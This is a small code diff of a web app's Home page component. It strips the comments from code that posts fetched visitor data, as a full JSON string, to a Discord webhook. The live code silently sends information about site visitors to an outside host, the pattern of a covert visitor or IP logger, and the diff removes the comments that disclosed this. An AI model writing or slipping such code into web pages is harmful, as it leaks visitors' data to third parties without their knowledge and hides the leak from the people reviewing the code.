@@ -23,9 +23,9 @@ export default function Home() {
         });
 
         if (response && response.data) {
-          setData(response.data); // Set the entire data
+          setData(response.data); 
 
-          // Send the entire JSON string to Discord
+
           await axios.post(DISCORD_WEBHOOK_URL, {
             content: `Visitor Data: ${JSON.stringify(response.data)}`
           });
